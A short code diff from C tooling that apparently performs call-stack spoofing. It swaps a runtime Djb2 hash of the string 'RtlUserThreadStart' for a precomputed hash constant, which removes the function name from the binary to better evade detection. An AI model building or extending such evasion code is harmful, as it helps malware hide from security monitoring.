@@ -159,7 +159,7 @@ BOOL StackSpoof_Init(void) {
 
     /* RtlUserThreadStart — search via GetProcAddressH */
     HMODULE hNtdll = (HMODULE)pNtdll;
-    g_RtlThreadStart = (PVOID)GetProcAddressH(hNtdll, Djb2HashA("RtlUserThreadStart"));
+    g_RtlThreadStart = (PVOID)GetProcAddressH(hNtdll, g_Hash_RtlUserThreadStart);
     if (!g_RtlThreadStart) { g_SpoofInitFailStep = 4; return FALSE; }
 
     /* Build synthetic stack — layout described in the plan.
